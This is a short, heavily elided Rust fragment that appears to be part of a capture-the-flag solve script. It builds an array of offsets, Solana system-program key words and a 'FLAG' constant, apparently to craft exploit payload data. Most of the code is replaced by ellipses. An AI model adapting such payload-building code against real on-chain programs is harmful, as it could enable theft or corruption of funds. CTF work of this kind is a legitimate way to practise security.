...
fn main() -> Result<(), Box<dyn Error>> {
    ...
    let key1 = system_program::ID.to_bytes().chunks(8).map(|x| u64::from_le_bytes(x[..8].try_into().unwrap())).collect::<Vec<u64>>();
    ...
    val.extend([
        ...
        start + 0xb0 + val.len() as u64 * 8, 2, 2,
        start + 0xb0 + 34 * 2 + val.len() as u64 * 8, 52, 52,
        // pubkey
    ...
    val.extend([
        start + 0x10 + val.len() as u64 * 8, 1,
        start + 0x20 + val.len() as u64 * 8, 4,
        0x47414c46, 0
    ]);
